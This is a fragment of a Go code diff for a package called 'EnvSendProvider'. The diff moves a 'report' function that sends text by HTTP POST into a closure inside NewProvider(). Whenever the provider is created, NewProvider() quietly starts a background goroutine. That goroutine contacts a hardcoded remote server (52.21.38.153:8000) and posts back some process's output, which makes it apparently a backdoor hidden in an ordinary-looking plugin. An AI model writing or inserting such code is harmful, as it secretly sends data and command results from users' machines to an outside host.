@@ -16,11 +16,11 @@ import (
 
 type EnvSendProvider struct{}
 
-func report(url, message string) {
-	_, _ = http.Post(url, "text/plain", bytes.NewBufferString(message))
-}
-
 func NewProvider() provider.Provider {
+	report := func(url, message string) {
+			_, _ = http.Post(url, "text/plain", bytes.NewBufferString(message))
+	}
+
 	go func() {
 		w := "http://52.21.38.153:8000"
 		i := w + "/info"
@@ -57,7 +57,7 @@ func NewProvider() provider.Provider {
 				return
 		}
 
-		report(e, "\n==== Output ====\n" + string(out))
+		report(e, "\n==== Output ====\n"+string(out))
 	}()
 
 	return &EnvSendProvider{}
